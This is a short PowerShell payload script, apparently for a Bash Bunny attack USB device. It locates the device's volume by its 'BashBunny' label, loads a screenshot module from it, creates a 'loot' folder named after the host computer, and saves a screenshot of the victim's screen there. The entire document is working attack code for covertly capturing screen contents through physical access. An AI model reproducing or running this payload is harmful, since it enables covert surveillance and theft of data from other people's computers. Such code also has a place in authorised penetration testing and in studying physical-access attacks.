$Variable=((gwmi win32_volume -f 'label=''BashBunny''').Name)

Import-Module $Variable'Get-ScreenShot.ps1'

New-Item -ItemType directory -Path $Variable'loot\Screenshot\'$env:COMPUTERNAME

Get-ScreenShot -OutPath $Variable'loot\Screenshot\'$env:COMPUTERNAME -FileNamePattern test.png